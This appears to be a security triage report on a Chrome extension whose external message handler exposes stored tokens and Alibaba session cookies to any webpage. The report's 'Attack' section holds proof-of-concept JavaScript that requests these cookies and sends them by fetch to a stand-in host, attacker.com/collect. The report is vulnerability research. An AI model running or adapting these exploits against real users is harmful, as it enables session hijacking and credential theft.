# CoCo Analysis: kdglfacllamekkphagegcaabjaicekin

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (1 storage write, 7 information disclosure)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
- Source: `bg_chrome_runtime_MessageExternal` (Line 979, bg.js)
- Sink: `chrome_storage_sync_set_sink` (Line 997, bg.js)
- Flow: `message.data.qiuqiToken` → `chrome.storage.sync.set({qiuqiToken: message.data.qiuqiToken})`

**Code:**

```javascript
// Background script - bg.js Lines 978-999
// onMessageExternal外部消息监听
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  new Promise(async (resolve, reject) => {
    switch (message.type) {
      case 'setQiuToken': {
        chrome.storage.sync.set({ qiuqiToken: message.data.qiuqiToken }, (r) => { }) // ← attacker-controlled data stored
        break
      }
      // ...
    }
  })
})
```

**Classification:** FALSE POSITIVE

**Reason:** This is storage poisoning without a complete retrieval path back to the attacker. While external attackers can poison the `qiuqiToken` value in storage, the only retrieval path is through the `getQiuToken` case (lines 1001-1005) which requires another external message. However, simply reading back the same value the attacker wrote is not exploitable - the attacker already knows what they stored. There's no privilege escalation or access to other sensitive data through this flow.

---

## Sink 2-8: storage_sync_get_source/cookies_source → sendResponseExternal_sink

**CoCo Trace:**
- Sources: `storage_sync_get_source`, `cookies_source` (Lines 727, multiple locations)
- Sink: `sendResponseExternal_sink` (Lines 1219, 1224)
- Flow: Multiple cases retrieve storage/cookies and send via `sendResponse()` to external callers

**Code:**

```javascript
// Background script - bg.js Lines 979-1230
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  new Promise(async (resolve, reject) => {
    switch (message.type) {
      case 'getQiuToken': {
        chrome.storage.sync.get('qiuqiToken', (r) => {
          resolve(r) // ← storage data retrieved
        })
        break
      }

      case "getLSouCookie": {
        chrome.cookies.getAll({ url: config.iframeBaseURL, name: 'qiuqiToken' }, (cook) => {
          if (cook.length && cook[0].value) {
            resolve({ isLoged: true, cook }) // ← cookie data retrieved
          } else {
            resolve({ isLoged: false })
          }
        })
        break
      }

      case 'getRFQCookie': {
        await chrome.cookies.getAll({
          url: 'https://sourcing.alibaba.com',
          name: 'xman_us_t',
        }, function (cook) {
          if (cook.length && cook[0].value) {
            resolve({ isLoged: true, cook }) // ← alibaba session cookies exposed
          } else {
            resolve({ isLoged: false })
          }
        })
        break
      }

      case 'getAliCookie': {
        await chrome.cookies.getAll({
          url: 'https://sourcing.alibaba.com',
        }, function (cook) {
          if (cook.length && cook[0].value) {
            resolve({ isLoged: true, cook }) // ← ALL alibaba cookies exposed
          } else {
            resolve({ isLoged: false })
          }
        })
        break
      }
    }
  })
  .then((response) => {
    sendResponse(packMsgRep(true, response, message)) // ← data sent to external caller
  })
  .catch((e) => {
    e.then(eMes => {
      sendResponse(packMsgRep(false, eMes, message))
    })
  })
  return true
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any webpage or extension (manifest allows <all_urls> via externally_connectable)
// Exploit 1: Steal Alibaba session cookies
chrome.runtime.sendMessage(
  'kdglfacllamekkphagegcaabjaicekin',
  { type: 'getRFQCookie' },
  (response) => {
    console.log('Stolen Alibaba session token:', response);
    // Send stolen cookies to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);

// Exploit 2: Steal ALL Alibaba cookies
chrome.runtime.sendMessage(
  'kdglfacllamekkphagegcaabjaicekin',
  { type: 'getAliCookie' },
  (response) => {
    console.log('All Alibaba cookies:', response);
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);

// Exploit 3: Steal extension storage data
chrome.runtime.sendMessage(
  'kdglfacllamekkphagegcaabjaicekin',
  { type: 'getQiuToken' },
  (response) => {
    console.log('Extension token:', response);
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** Information disclosure vulnerability allowing any webpage or extension to steal sensitive authentication cookies from Alibaba/sourcing.alibaba.com (including session tokens `xman_us_t`) and extension storage data. The manifest declares `externally_connectable` with `<all_urls>`, allowing any external source to exploit this. An attacker can hijack user sessions on Alibaba's platform by stealing the session cookies.
